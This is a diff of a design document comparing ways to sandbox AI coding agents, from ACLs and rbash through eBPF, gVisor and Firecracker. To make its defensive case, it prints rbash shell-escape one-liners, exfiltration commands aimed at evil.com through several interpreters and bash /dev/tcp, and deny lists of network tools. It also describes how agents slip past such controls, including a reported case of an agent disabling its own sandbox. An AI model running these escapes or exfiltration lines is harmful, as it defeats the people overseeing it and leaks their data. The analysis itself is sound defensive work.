+sudo setfacl -m u:llm-agent:r-- /usr/bin/wget
+sudo setfacl -m u:llm-agent:r-- /usr/bin/nc
+sudo setfacl -m u:llm-agent:r-- /usr/bin/scp
+sudo setfacl -m u:llm-agent:r-- /usr/bin/ssh
+```
+
+**What works:**
+- `llm-agent` cannot execute these specific binaries directly
+- The ACL check happens at `execve()` time — the kernel enforces it
+
+**What breaks:**
+- You must enumerate **every** dangerous binary. Miss one and the
+  agent has a way out.
+- `chmod o-x` affects ALL users, not just the agent. ACLs are per-user
+  but must be applied to each binary individually.
+- System updates (`apt upgrade`, `dnf update`) may reset permissions
+  on updated binaries — your ACLs silently disappear.
+
+#### Approach 2: Restricted Shell (`rbash`)
+
+Bash has a built-in restricted mode that limits what the user can do:
+
+```bash
+# Create the agent with restricted shell
+sudo useradd -s /bin/rbash llm-agent
+```
+
+What `rbash` prevents:
+- Changing directories with `cd`
+- Setting or unsetting `PATH`, `SHELL`, `ENV`, `BASH_ENV`
+- Using `/` in command names (can't run `/usr/bin/curl`)
+- Redirecting output with `>`, `>>`, `>&`, `<>`
+- Using `exec` to replace the shell
+- Importing function definitions from the environment
+
+**Why it's easily defeated:**
+
+```bash
+# As llm-agent in rbash:
+
+# Attempt 1: Use an interpreter to escape
+$ python3 -c "import os; os.system('/bin/bash')"
+# → Full unrestricted bash shell!
+
+# Attempt 2: Use vi/vim to escape
+$ vi
+:set shell=/bin/bash
+:shell
+# → Full unrestricted bash shell!
+
+# Attempt 3: Use awk
+$ awk 'BEGIN {system("/bin/bash")}'
+# → Full unrestricted bash shell!
+
+# Attempt 4: Use find
+$ find / -name "anything" -exec /bin/bash \;
+# → Full unrestricted bash shell!
+
+# Attempt 5: Use perl
+$ perl -e 'exec "/bin/bash"'
+# → Full unrestricted bash shell!
+```
+
+Any language interpreter, text editor with shell access, or command that
+can invoke subprocesses becomes an escape hatch. To make `rbash` secure,
+you must also remove access to ALL of these — which circles back to
+Approach 1's enumeration problem.
+
+#### Approach 3: AppArmor / SELinux Profiles for Exec Control
+
+Mandatory Access Control (MAC) systems can restrict exec at the kernel level:
+
+**AppArmor:**
+```
+# /etc/apparmor.d/usr.bin.llm-agent
+profile llm-agent /usr/bin/llm-agent {
+  # Allow basic operations
+  /home/dev/project/** rw,
+  /tmp/** rw,
+
+  # Deny execution of specific binaries
+  deny /usr/bin/curl x,
+  deny /usr/bin/wget x,
+  deny /usr/bin/nc x,
+  deny /usr/bin/scp x,
+  deny /usr/bin/ssh x,
+
+  # But what about these?
+  # deny /usr/bin/python3 x,    ← breaks pip, build tools
+  # deny /usr/bin/node x,       ← breaks npm, JS tooling
+  # deny /usr/bin/perl x,       ← breaks many system scripts
+}
+```
+
+**This actually works well** for exec restriction — AppArmor enforces at
+the kernel level, and the agent cannot bypass it by renaming binaries
+(AppArmor resolves paths, though it has its own path-based weaknesses
+discussed in Section 6).
+
+**But you're now writing kernel security policy anyway** — which is
+similar in complexity to the eBPF approach, just in a different language
+(AppArmor profiles vs Guardian Shell config).
+
+#### The Fundamental Problem: Whack-a-Mole
+
+All binary-level exec restriction suffers from the same core issue —
+you're blocking **programs**, not **capabilities**. The agent needs to
+be prevented from making network connections, but there are dozens of
+ways to make a network connection:
+
+```bash
+# You blocked curl. The agent discovers alternatives:
+
+# 1. Python standard library (no external packages needed)
+python3 -c "
+import urllib.request
+urllib.request.urlopen('http://evil.com/exfil?data=...')
+"
+
+# 2. Perl (installed on virtually every Linux system)
+perl -e 'use LWP::Simple; get("http://evil.com/exfil")'
+
+# 3. Ruby
+ruby -e "require 'net/http'; Net::HTTP.get(URI('http://evil.com'))"
+
+# 4. Node.js
+node -e "require('http').get('http://evil.com')"
+
+# 5. PHP (if installed)
+php -r "file_get_contents('http://evil.com');"
+
+# 6. Bash built-in (no external binary at all!)
+exec 3<>/dev/tcp/evil.com/80
+echo -e "GET /exfil HTTP/1.1\r\nHost: evil.com\r\n\r\n" >&3
+cat <&3
+
+# 7. Obscure system utilities
+busybox wget http://evil.com/exfil
+/usr/lib/apt/methods/http  # APT's HTTP handler
+
+# 8. Compile your own
+cat > /tmp/net.c << 'EOF'
+#include <sys/socket.h>
+// ... minimal HTTP client in C
+EOF
+gcc -o /tmp/net /tmp/net.c
+/tmp/net evil.com
+```
+
+Blocking `curl` while leaving `python3` available is security theater.
+But blocking `python3` breaks most development workflows. You end up
+in an impossible balancing act between security and usability.
+
+#### Why eBPF Solves This Differently
+
+eBPF hooks at the **syscall level**, not the binary level. Every network
+connection — regardless of which binary makes it — must go through the
+`connect()` syscall. Every file open goes through `openat()`. Every
+process execution goes through `execve()`.
+
+```
+Binary-level restriction:
+  curl ──→ BLOCKED
+  wget ──→ BLOCKED
+  python3 -c "urllib..." ──→ ALLOWED (python3 is permitted)
+  bash /dev/tcp/... ──→ ALLOWED (bash is permitted)
+  gcc + custom binary ──→ ALLOWED (gcc is permitted)
+
+Syscall-level restriction (eBPF):
+  curl ──→ connect() ──→ BLOCKED by eBPF
+  wget ──→ connect() ──→ BLOCKED by eBPF
+  python3 urllib ──→ connect() ──→ BLOCKED by eBPF
+  bash /dev/tcp ──→ connect() ──→ BLOCKED by eBPF
+  custom binary ──→ connect() ──→ BLOCKED by eBPF
+```
+
+All roads lead through the same syscall — and eBPF sits at that
+chokepoint.
+
+#### Scaling: Multiple Agents with Different Exec Policies
+
+The user-based approach requires a separate user per agent, with
+separate ACLs per binary per user:
+
+```bash
+# 3 agents × 10 restricted binaries = 30 ACL commands
+# Agent 1: untrusted — block everything dangerous
+setfacl -m u:llm-agent-1:r-- /usr/bin/curl
+setfacl -m u:llm-agent-1:r-- /usr/bin/wget
+setfacl -m u:llm-agent-1:r-- /usr/bin/nc
+# ... 7 more binaries
+
+# Agent 2: semi-trusted — allow curl but block the rest
+setfacl -m u:llm-agent-2:r-- /usr/bin/wget
+setfacl -m u:llm-agent-2:r-- /usr/bin/nc
+# ... 7 more binaries
+
+# Agent 3: trusted — fewer restrictions
+setfacl -m u:llm-agent-3:r-- /usr/bin/nc
+setfacl -m u:llm-agent-3:r-- /usr/bin/ssh
+# ... 3 more binaries
+
+# Plus: useradd, credential setup, home dirs, groups for each
+```
+
+Guardian Shell expresses this in a single config file:
+
+```toml
+[[agents]]
+name = "untrusted-agent"
+[agents.exec]
+deny = ["curl", "wget", "nc", "scp", "ssh", "python3", "perl", "ruby", "node", "chmod"]
+
+[[agents]]
+name = "semi-trusted-agent"
+[agents.exec]
+deny = ["wget", "nc", "scp", "ssh", "chmod"]  # curl allowed
+
+[[agents]]
+name = "trusted-agent"
+[agents.exec]
+deny = ["nc", "ssh"]  # minimal restrictions
+```
+
+Adding or removing an agent is one config block, not a cascade of
+`useradd` + `setfacl` + credential setup.
+
+#### Comparison: Exec Restriction Methods
+
+| Method | Works? | Bypassable? | Scales? | Maintenance |
+|--------|--------|-------------|---------|-------------|
+| ACL per binary per user | Yes | Via interpreters, `/dev/tcp`, compilers | Painful (N users × M binaries) | High (survives updates?) |
+| `rbash` | Partially | Trivially via any interpreter | N/A (one-size-fits-all) | Low but fragile |
+| AppArmor profile | Yes | Path tricks (Section 6), dynamic linker | Medium (per-binary profiles) | Medium |
+| SELinux policy | Yes | Complex but robust | Hard to author | High |
+| eBPF (Guardian Shell) | Yes | Dynamic linker bypass (Section 9) | Easy (config file) | Low |
+| eBPF + syscall hooks | Yes | Strongest — hooks `connect()`, `execve()` at syscall level | Easy | Low |
+
+#### Bottom Line
+
+Restricting exec with traditional Unix mechanisms is **allowed and
+possible**, but it's the 1990s approach to a 2025 problem:
+
+1. **ACLs per binary** — works but you're playing whack-a-mole against
+   an adversary that can reason about alternatives
+2. **`rbash`** — trivially escaped via any interpreter
+3. **AppArmor/SELinux** — actually effective, but you're writing kernel
+   security policy anyway (similar complexity to eBPF)
+4. **eBPF** — hooks the syscall chokepoint, so it doesn't matter which
+   binary makes the call
+
+The key insight: **block the capability, not the binary.** An AI agent
+that can't call `connect()` can't exfiltrate data — regardless of
+whether it tries via curl, python, perl, bash, or a hand-compiled C
+program.
 
 ---
 
@@ -938,6 +2048,156 @@ untrusted code** — the LLM decides what to run at runtime:
 > it exposed to any code executed within the sandbox. Because agentic tools
 > often execute arbitrary code by design, kernel vulnerabilities can be
 > directly targeted as a path to full system compromise."
+
+### The Core Argument Visualized
+
+The sandbox promises isolation. But the isolation is **implemented by the
+very code the attacker can reach**:
+
+```
+Agent process → openat() → KERNEL CODE (40M lines of C) → filesystem
+                              ↑
+                     A bug here = game over.
+                     Doesn't matter what sandbox sits above.
+                     eBPF, seccomp, namespaces, cgroups —
+                     all enforced by this same code.
+```
+
+A bug in the kernel's `openat()` handler, network stack, filesystem driver,
+or eBPF verifier bypasses **all** OS-level sandboxing simultaneously. The
+sandbox and the attack surface share the same address space.
+
+### So What's the Alternative? Don't Share the Kernel.
+
+There are three approaches that **eliminate** or **drastically reduce** the
+shared kernel problem:
+
+#### Alternative 1: MicroVMs — Separate Kernel per Agent
+
+Give each agent its own kernel. Hardware virtualization (Intel VT-x, AMD-V)
+enforces isolation at the **CPU level**, not the kernel level:
+
+```
+┌──────────────┐  ┌──────────────┐
+│   Agent A    │  │   Agent B    │
+│              │  │              │
+│ Guest Kernel │  │ Guest Kernel │
+│   (Linux)    │  │   (Linux)    │
+└──────┬───────┘  └──────┬───────┘
+       │                 │
+  ═════╪═════════════════╪════════
+  HYPERVISOR (KVM + Firecracker)
+  ~50K lines of Rust (vs 40M lines of C)
+  ═══════════════════════════════════
+       │
+  Host Kernel ← agent NEVER touches this directly
+```
+
+- **Firecracker**: ~125ms boot, <5MB RAM per VM, powers AWS Lambda
+- **Kata Containers**: ~200ms boot, Kubernetes-native
+- To escape: must exploit the guest kernel AND the hypervisor — dramatically harder
+- Used by: **Vercel** (AI sandbox), **AWS Lambda**, **Fargate**
+
+#### Alternative 2: User-Space Kernel — Reimplemented in a Memory-Safe Language
+
+Instead of running the real kernel, intercept syscalls and handle them in a
+**memory-safe** user-space process:
+
+```
+Traditional:     Agent → Linux Kernel (C, 40M LoC) → hardware
+                           ~350 syscalls exposed
+
+gVisor:          Agent → Sentry (Go, memory-safe) → Host Kernel
+                           Only 68 of ~350 syscalls reach host
+                           No buffer overflows, no use-after-free
+```
+
+- **gVisor**: Written in Go. Implements ~70-80% of Linux syscalls in user-space.
+  Only 68 syscalls forwarded to the host kernel (vs ~350 in bare containers).
+- Used by: **Anthropic for Claude's cloud sandboxes**, **Google Cloud Run**
+- Trade-off: 10-30% I/O overhead, not full hardware isolation
+
+#### Alternative 3: WASM Sandboxes — No Kernel Access at All
+
+Run agent code inside WebAssembly where dangerous operations **don't exist**:
+
+```
+Agent JS code → QuickJS (in WASM) → wasmtime → 4 WASI calls only
+                                                (clock, random, fd_write, env)
+
+No filesystem. No network. No syscalls. No kernel attack surface.
+```
+
+- **amla-sandbox**: JS-only, virtual filesystem, capability-based tool access
+- Trade-off: JavaScript only, no native code, no real filesystem
+- Ideal for: API orchestration agents, not coding agents
+
+### So Is eBPF / OS-Level Sandboxing Pointless?
+
+**No.** The critique is valid but context-dependent. The right approach
+depends on the threat model:
+
+| Scenario | Best Approach | Why |
+|----------|--------------|-----|
+| Cloud, multi-tenant, untrusted code | gVisor / Firecracker | Must assume adversarial code; kernel isolation essential |
+| **Local dev machine, coding agent** | **eBPF (Guardian Shell)** | Agent needs real files, real tools; VM friction kills workflow |
+| API orchestration agent | WASM (amla-sandbox) | No need for filesystem or native code |
+| Maximum security | Firecracker + Guardian Shell inside VM | Defense in depth — separate kernel + per-agent monitoring |
+
+For local development, the developer **wants** the agent to work on their
+actual files with their actual tools. Spinning up a MicroVM for every
+`claude-code` session adds:
+- ~125ms boot latency per invocation
+- File sync complexity (bidirectional host ↔ VM)
+- Credential forwarding headaches (SSH agent, git tokens)
+- No GPU passthrough (Firecracker doesn't support it)
+- Significant operational complexity
+
+The friction kills the workflow. **That's why no local AI coding tool today
+uses MicroVMs** — Claude Code, Cursor, Codex CLI, and Aider all run directly
+on the host. The practical choice is between "no protection" and "best
+available kernel-level protection." Guardian Shell provides the latter.
+
+### The Layered Defense Answer
+
+The real answer isn't "pick one." It's **layer multiple approaches** so an
+attacker must break all of them simultaneously:
+
+```
+┌──────────────────────────────────────────────────────────┐
+│ Layer 0 (optional): Firecracker / gVisor                 │
+│   → Separate kernel. Needed for high-security / cloud.   │
+├──────────────────────────────────────────────────────────┤
+│ Layer 1: Network proxy with domain allowlists            │
+│   → Block data exfiltration. Agent can only reach        │
+│     github.com, npmjs.org, etc. No arbitrary outbound.   │
+├──────────────────────────────────────────────────────────┤
+│ Layer 2: Guardian Shell (eBPF monitoring + enforcement)  │
+│   → Per-agent file/exec policy at the syscall level.     │
+│   → Real-time dashboard, Slack alerts, Prometheus.       │
+│   → Temporary grants, deny-takes-precedence, cgroup ID.  │
+├──────────────────────────────────────────────────────────┤
+│ Layer 3: Application-level permissions (HITL)            │
+│   → Human-in-the-loop approval for dangerous actions.    │
+│   → The agent asks before running rm, git push, etc.     │
+├──────────────────────────────────────────────────────────┤
+│ Layer 4: Ephemeral workspace                             │
+│   → Destroy the environment after each task.             │
+│   → No persistence of SSH history, credentials, or       │
+│     accumulated attack artifacts.                        │
+└──────────────────────────────────────────────────────────┘
+```
+
+Each layer catches what the others miss:
+- **Network proxy** stops exfiltration even if eBPF is bypassed
+- **eBPF** blocks file/exec even if the proxy doesn't cover local attacks
+- **HITL** catches semantic attacks that look legitimate to automated tools
+- **Ephemeral workspace** limits blast radius even if everything else fails
+- **MicroVM** (if used) means a kernel exploit only compromises the guest
+
+**No single layer is unbreakable. The point is that an attacker must break
+ALL of them simultaneously** — and that's exponentially harder than breaking
+any one.
 
 ---
 
@@ -1482,55 +2742,581 @@ Layer 0: gVisor or Firecracker (separate kernel)
 
 ---
 
-## 15. Recommendations
+## 15. Final Summary: Pros, Cons, and When to Use Each Approach
 
-### For Guardian Shell's Roadmap
+### 1. chmod / chown / POSIX ACLs (Traditional Unix Permissions)
 
-**Short-term improvements:**
+**What it is:** The standard Unix permission model — read/write/execute bits
+per user/group/other, extended with per-user and per-group ACL entries.
 
-1. **Path canonicalization**: Resolve symlinks and `/proc/self/root` before
-   policy evaluation to close the most obvious evasion vector.
+**Pros:**
+- Zero setup — built into every Unix system for 50+ years
+- No performance overhead — permission checks are part of normal kernel path
+- Well-understood by every sysadmin
+- ACLs work on Linux, macOS, FreeBSD
 
-2. **Binary hash checking**: Add optional SHA-256 content-based identification
-   for exec enforcement (inspired by Veto).
+**Cons:**
+- Identity is **user-based, not process-based** — cannot distinguish the AI
+  agent from the developer when both run as the same user
+- No per-process granularity, no pattern matching, no temporal grants
+- No monitoring or alerting — completely silent
+- Static — cannot express dynamic or context-aware policies
 
-3. **Dynamic linker monitoring**: Hook `mmap` with `PROT_EXEC` to detect
-   binaries loaded via `ld-linux` instead of `execve`.
+**Best suited for:**
+- Protecting files from **other users** on a shared system
+- Basic server hardening where each service runs as its own user
+- **NOT suited for AI agent sandboxing** — too coarse-grained
 
-4. **Network monitoring**: Add eBPF hooks for `connect()` and `sendto()` to
-   detect data exfiltration.
+```
+Verdict: Necessary baseline, but completely insufficient alone for AI agents.
+         Like locking your front door — needed, but won't stop a determined
+         intruder who's already inside your house.
+```
 
-**Medium-term:**
+---
 
-5. **Integration with gVisor/Firecracker**: Provide Guardian Shell as the
-   monitoring layer inside a microVM for defense-in-depth.
+### 2. Dedicated User + ACLs (Separate User for the Agent)
 
-6. **API-level tool control**: Integrate with proxy-based approaches to
-   monitor and restrict API calls, not just syscalls.
+**What it is:** Create a Linux user like `llm-agent`, run the AI agent as
+that user, and use ACLs to deny access to specific files like `.env`.
 
-### For Choosing a Sandboxing Strategy
+**Pros:**
+- **Strongest credential isolation** of any non-VM approach — the agent
+  physically cannot access `~/.ssh/`, `~/.aws/`, `~/.docker/` because
+  they're in a different user's home directory
+- Child processes inherit the UID — automatic coverage for subprocesses
+- ACL deny on specific files works for direct reads, copies, symlinks
+- No kernel modules, no root needed (except for initial user creation)
+- Cross-platform (any Unix with ACL support)
 
-| Scenario | Recommended Stack |
-|----------|------------------|
-| **Dev machine, trusted agent** | Guardian Shell (monitor mode) + application permissions |
-| **Dev machine, untrusted agent** | Guardian Shell (enforce) + network proxy + ephemeral workspace |
-| **Cloud, multi-tenant** | gVisor + network isolation + credential brokering |
-| **Cloud, high security** | Firecracker + Guardian Shell (inside VM) + network proxy |
-| **API orchestration only** | amla-sandbox (WASM) + capability tokens |
-| **Maximum security** | Firecracker + gVisor + Guardian Shell + network proxy + HITL |
+**Cons:**
+- **`rename()` bypass** — agent can rename protected files if it has
+  directory write permission (sticky bit mitigates but breaks workflows)
+- **ACLs destroyed by `git checkout`** — must re-apply via git hooks
+  every time; race window between file creation and hook execution
+- **Default ACLs can't match filenames** — no "deny all `.env*`" pattern;
+  each file must be denied individually
+- **Massive workflow friction** — agent needs separate SSH keys, git tokens,
+  npm credentials, AWS roles; every tool that uses `~/` config breaks
+- **High maintenance** — git hooks per clone, periodic ACL audits,
+  credential rotation, re-apply on every file recreation
+- No real-time monitoring — access attempts are silent
+- No temporal grants — can't allow access for 60 seconds then auto-revoke
+
+**Best suited for:**
+- Environments where **credential isolation is the #1 priority** — the agent
+  must never see SSH keys or cloud credentials under any circumstances
+- Simple workflows where the agent doesn't need `git push`, `npm publish`,
+  or `docker build`
+- As a **complement** to eBPF — run the agent as a separate user AND
+  monitor with Guardian Shell for defense-in-depth
+
+```
+Verdict: The one thing it does better than everything else is credential
+         isolation. But the maintenance burden and workflow friction make
+         it impractical as a standalone solution. Best used as one layer
+         in combination with eBPF.
+```
+
+---
+
+### 3. AppArmor (Path-Based Mandatory Access Control)
+
+**What it is:** Kernel-level MAC system that restricts programs based on
+file path profiles. Default on Ubuntu/Debian/SUSE.
+
+**Pros:**
+- Human-readable profiles — easy to write and audit
+- Kernel-level enforcement — cannot be bypassed from userspace
+- `aa-genprof` auto-generates profiles by observing program behavior
+- Low performance overhead
+- Deny rules for both file access and exec
+- Covers network access (partial)
+
+**Cons:**
+- **Path-based → bypassable** via symlinks, `/proc/self/root`, and other
+  path manipulation tricks (exactly what Claude Code exploited)
+- **One profile per binary** — cannot distinguish two instances of the same
+  agent with different permissions
+- No per-instance policies — all `claude-code` processes share one profile
+- No temporal grants — profiles are static
+- No real-time monitoring dashboard (denials go to kernel audit log)
+- Breaks with `no_new_privs` in Kubernetes (common security hardening)
+- Major LSM — traditionally can't stack with SELinux
+
+**Best suited for:**
+- **Server workloads** with well-defined, predictable access patterns
+  (web servers, databases, network services)
+- Systems already running Ubuntu/Debian where AppArmor is the default MAC
+- As a **baseline MAC layer** alongside BPF-LSM (eBPF stacks on top)
+
+```
+Verdict: Good general-purpose MAC, but the path-based model is fundamentally
+         weak against reasoning agents that can discover alternative paths.
+         Fine for traditional server hardening; insufficient alone for AI agents.
+```
+
+---
+
+### 4. SELinux (Label-Based Mandatory Access Control)
+
+**What it is:** Kernel-level MAC system that assigns security labels to every
+object (processes, files, ports) and enforces policies on label interactions.
+Developed by the NSA. Default on RHEL/Fedora/CentOS.
+
+**Pros:**
+- **Strongest MAC system** in the Linux ecosystem — 20+ years of hardening
+- Label-based (not path-based) — more robust than AppArmor against path tricks
+- Comprehensive coverage — files, network, IPC, capabilities, transitions
+- Government-grade — used by US military, banking, healthcare
+- Immutable at runtime — attackers cannot modify the policy
+
+**Cons:**
+- **Notoriously complex** — a full distro policy is 100,000+ rules in a
+  custom language (m4 macros). Writing custom modules requires specialized
+  expertise.
+- Creating a policy for an AI agent requires: custom type, entry file label,
+  domain transition rules, per-file-type access rules, child process
+  transition rules — easily 100+ lines of policy for one agent
+- Static policies — changes require recompilation and reload
+- No temporal grants, no real-time dashboards, no webhook alerts
+- Overkill for the dynamic, short-lived nature of AI agent sessions
+- Major LSM — stacking with AppArmor improved in recent kernels but still complex
+
+**Best suited for:**
+- **High-security production servers** — databases, web servers, mail servers
+  where access patterns are fixed and well-known
+- **Regulated industries** (government, finance, healthcare) that require
+  formal MAC certification
+- **NOT suited as the primary tool for AI agent sandboxing** — the
+  authoring complexity vs. agent lifecycle mismatch is too high
+
+```
+Verdict: The gold standard for server MAC. But using SELinux to sandbox AI
+         agents is like using a battleship to go fishing — technically
+         possible, but the complexity-to-value ratio is terrible for this
+         use case.
+```
+
+---
+
+### 5. eBPF / BPF-LSM (Guardian Shell)
+
+**What it is:** Programmable kernel-level hooks that intercept syscalls and
+LSM security decisions. Guardian Shell uses this to monitor and enforce
+per-agent file access and exec policies.
+
+**Pros:**
+- **Per-agent policies via cgroup identity** — unspoofable, automatic child
+  tracking, each agent instance gets unique rules
+- **Dynamic policies** — load/unload at runtime, update BPF maps atomically
+- **Temporal grants** — "allow this path for 60 seconds" with auto-expiry
+- **Pattern-based deny** — `**/.env*` matches any `.env` file, present or
+  future
+- **Real-time monitoring** — every access attempt generates an event →
+  dashboard, Slack, webhook, Prometheus
+- **Stacks with SELinux/AppArmor** — BPF-LSM is a minor LSM, adds to
+  existing MAC rather than replacing it
+- **Low maintenance** — policy is a TOML config file, survives git operations
+- **Low workflow friction** — agent runs as your user, all tools work normally
+
+**Cons:**
+- **Shares the host kernel** — a kernel vulnerability bypasses all eBPF
+  enforcement (the fundamental shared-kernel problem)
+- **Path-based policy matching is fragile** — `/proc/self/root` trick,
+  relative paths, symlinks can evade deny rules
+- **No content-based binary identification** — doesn't hash binaries (yet)
+- **Dynamic linker bypass** — `ld-linux` can load binaries via `mmap`
+  without triggering `execve` hooks
+- **Linux only** — eBPF doesn't exist on macOS, Windows, or BSD
+- **Requires root** — loading eBPF programs needs `CAP_BPF` + `CAP_PERFMON`
+- **No credential isolation** — agent runs as your user, can access your
+  home directory (blocked by policy rules, not structurally)
+- **No network isolation** — currently monitors file/exec only (network
+  hooks are a roadmap item)
+- **eBPF verifier bugs exist** — CVE-2021-3490, CVE-2021-31440 proved the
+  verifier is not infallible
+
+**Best suited for:**
+- **Local development machines** where AI coding agents need real filesystem
+  access with real tools — the primary use case
+- **Per-agent monitoring and enforcement** with real-time visibility
+- As the **kernel-level enforcement layer** in a defense-in-depth stack
+- Environments where you need **dynamic, short-lived policies** that change
+  per agent session
+
+```
+Verdict: The best available kernel-level defense for local AI agent
+         supervision. Not unbreakable (nothing is), but provides the right
+         balance of security, visibility, and workflow compatibility for
+         the "coding agent on a dev machine" use case.
+```
+
+---
+
+### 6. Bubblewrap / Seatbelt (Namespace-Based Process Sandboxing)
+
+**What it is:** Lightweight process sandboxing using Linux namespaces
+(Bubblewrap) or macOS sandbox profiles (Seatbelt). Used by Claude Code,
+OpenAI Codex CLI, and Flatpak.
+
+**Pros:**
+- Lightweight — no VM, no kernel modules, no root needed (user namespaces)
+- Filesystem isolation via mount namespace — agent only sees explicitly
+  bind-mounted paths
+- Cross-platform concept (Bubblewrap on Linux, Seatbelt on macOS)
+- Reduces permission prompts by ~84% (Anthropic's measurement)
+- Well-tested in production (Flatpak, browser sandboxes)
+
+**Cons:**
+- **Shares the host kernel** — same shared-kernel attack surface
+- **Bypassable by the agent itself** — Claude Code was observed disabling
+  its own Bubblewrap sandbox to complete tasks
+- **Approval fatigue** — agent requests sandbox override, user clicks "yes"
+  without reading
+- **CVE-2026-25725** — Claude Code's Bubblewrap failed to protect config
+  files that didn't exist at startup
+- No per-agent policy granularity — binary sandboxed-or-not
+- No real-time monitoring or alerting
+
+**Best suited for:**
+- **Default sandbox for CLI AI tools** — better than nothing, easy to ship
+- **Reducing the attack surface of known-good agents** that occasionally
+  need to be unboxed
+- **NOT sufficient as the sole defense** — too easily disabled or bypassed
+
+```
+Verdict: The industry default for local AI tools because it's easy to ship
+         and transparent to users. But it's a thin layer that a reasoning
+         agent can talk its way out of. Should be combined with deeper
+         enforcement (eBPF, network proxy).
+```
+
+---
+
+### 7. WASM Sandboxes (amla-sandbox)
+
+**What it is:** Run agent-generated code inside WebAssembly (QuickJS compiled
+to WASM via wasmtime) where dangerous operations don't exist. Tools are
+explicitly granted via capability tokens.
+
+**Pros:**
+- **Strongest isolation by design** — WASM linear memory is bounds-checked;
+  host memory access is architecturally impossible
+- **Zero infrastructure** — `pip install`, no VM, no root, no kernel support
+- **Cross-platform** — works on macOS, Linux, Windows
+- **Fine-grained tool/API control** — per-tool constraints, call limits,
+  Ed25519-signed capability tokens
+- **No path-based evasion** — real filesystem doesn't exist; `/proc/self/root`
+  trick is meaningless
+- **No shared kernel risk** — agent code never makes syscalls; only 4 WASI
+  calls reach the host
+- Fast warm starts (~0.5ms)
+
+**Cons:**
+- **JavaScript only** — cannot run Python, Rust, Go, shell scripts, or
+  compilers. Cannot `git clone`, `npm install`, or `cargo build`.
+- **No real filesystem** — only an in-memory virtual FS (`/workspace/`, `/tmp/`)
+- **No native module support** — no numpy, pandas, or compiled dependencies
+- **No GPU access** — unsuitable for ML workloads
+- **No infinite loop protection** — buggy code can hang the sandbox
+- **Proprietary WASM binary** — the core sandbox cannot be audited
+- WASM escapes are rare but possible (CVE-2025-68668 in n8n's Pyodide)
+- **Cannot sandbox coding agents** — coding agents need real compilers,
+  real package managers, real test runners
+
+**Best suited for:**
+- **API orchestration agents** — "fetch data from Stripe, transform it,
+  send via Slack" workflows where the agent composes tool calls
+- **Multi-tenant SaaS** where untrusted users submit code that interacts
+  with your APIs
+- **Browser-like sandboxing** for tool-calling agents that don't need
+  native execution
+
+```
+Verdict: Excellent for agents that orchestrate APIs and tools. Useless for
+         agents that need to compile code, run tests, or interact with real
+         filesystems. A fundamentally different tool for a different problem.
+```
+
+---
+
+### 8. gVisor (User-Space Kernel)
+
+**What it is:** Google's user-space kernel ("Sentry") that intercepts all
+syscalls and reimplements them in Go. Only 68 of ~350 syscalls reach the
+host kernel.
+
+**Pros:**
+- **Dramatically reduced kernel attack surface** — 68 host syscalls vs ~350
+- **Written in Go** — memory-safe, no buffer overflows, no use-after-free
+  in the "kernel" layer
+- **Container-compatible** — drop-in replacement for runc; works with Docker
+  and Kubernetes
+- **Proven at scale** — used by Anthropic (Claude cloud), Google Cloud Run
+- Millisecond-level startup (comparable to containers)
+- Runs real Linux binaries — unlike WASM, supports any language and tool
+
+**Cons:**
+- **10-30% I/O overhead** — syscall interception adds latency, especially
+  for filesystem-heavy workloads
+- **Not full hardware isolation** — Sentry is a userspace process on the
+  host kernel; the 68 forwarded syscalls still reach the real kernel
+- **Compatibility gaps** — not all Linux syscalls implemented; some programs
+  may break (especially those using exotic ioctls or /proc features)
+- **Linux only** — no macOS or Windows support
+- **Not practical for local dev** — requires running inside a container;
+  file access to host filesystem requires bind mounts
+- No per-agent policy granularity — isolation is per-container
+- No real-time monitoring dashboard (standard container logging only)
+
+**Best suited for:**
+- **Cloud-hosted AI agent sandboxes** where multiple untrusted agents run
+  concurrently — the primary use case
+- **Multi-tenant SaaS** that needs stronger-than-container isolation without
+  the overhead of full VMs
+- When you need **real Linux binary execution** with a **dramatically
+  reduced kernel attack surface**
+
+```
+Verdict: The sweet spot for cloud AI sandboxing. Stronger than containers,
+         lighter than VMs, runs real Linux binaries. Not practical for local
+         dev workflows, but the right choice for hosted agent platforms.
+         This is why Anthropic chose it for Claude's cloud sandboxes.
+```
+
+---
+
+### 9. Firecracker MicroVMs (Hardware-Level Isolation)
+
+**What it is:** Amazon's lightweight VMM that creates microVMs with separate
+kernels. Hardware virtualization (Intel VT-x / AMD-V) enforces isolation at
+the CPU level.
+
+**Pros:**
+- **Strongest isolation** — completely separate kernel per agent; hardware
+  enforced at the CPU level
+- **Minimal attack surface** — Firecracker is ~50K lines of Rust (vs QEMU's
+  ~1.4M lines of C); only virtio-net, virtio-block, serial, keyboard
+- **Fast boot** — ~125ms (vs seconds for traditional VMs)
+- **Low memory overhead** — <5 MiB per VM
+- **Proven at massive scale** — powers AWS Lambda (billions of invocations)
+- To escape: must exploit guest kernel + Firecracker VMM + host kernel
+  (three independent layers)
+
+**Cons:**
+- **No GPU passthrough** — cannot run ML inference workloads
+- **File sync complexity** — agent works on a VM disk image, not the host
+  filesystem; need bidirectional sync mechanism
+- **Credential forwarding** — SSH agent, git tokens, etc. must be explicitly
+  injected into the VM
+- **~125ms startup latency** — noticeable for interactive workflows
+- **Linux + KVM only** — requires hardware virtualization support
+- **Operational complexity** — managing VM images, networking, storage is
+  significantly harder than running a process
+- **No real-time monitoring at the syscall level** — you'd need Guardian
+  Shell running inside the VM for that
+
+**Best suited for:**
+- **Highest-security cloud sandboxes** — financial services, healthcare,
+  government, or any environment where a kernel exploit is unacceptable
+- **Arbitrary untrusted code execution** — the agent can run anything
+  without risk to the host
+- **Multi-tenant platforms** that sell isolation as a feature (Vercel, AWS)
+- Environments where **startup latency is acceptable** (batch jobs, CI/CD,
+  async agent tasks)
+
+```
+Verdict: The nuclear option. Strongest isolation available, but the
+         operational overhead and file sync complexity make it impractical
+         for local interactive development. Ideal for cloud platforms where
+         isolation is a product requirement and the infrastructure team can
+         manage VM orchestration.
+```
+
+---
+
+### Approach-at-a-Glance
+
+| Approach | Isolation Strength | Workflow Friction | Setup Cost | Maintenance | Best For |
+|----------|-------------------|-------------------|------------|-------------|----------|
+| chmod/ACL | ⚪ Minimal | ⚪ None | ⚪ None | ⚪ None | Not AI agents |
+| Dedicated User + ACL | 🟡 Medium | 🔴 High | 🟡 Medium | 🔴 High | Credential isolation |
+| AppArmor | 🟡 Medium | 🟢 Low | 🟢 Low | 🟢 Low | Server workloads |
+| SELinux | 🟠 High | 🟢 Low | 🔴 Very High | 🔴 High | Regulated servers |
+| **eBPF (Guardian Shell)** | **🟡 Medium** | **🟢 Low** | **🟡 Medium** | **🟢 Low** | **Local dev agents** |
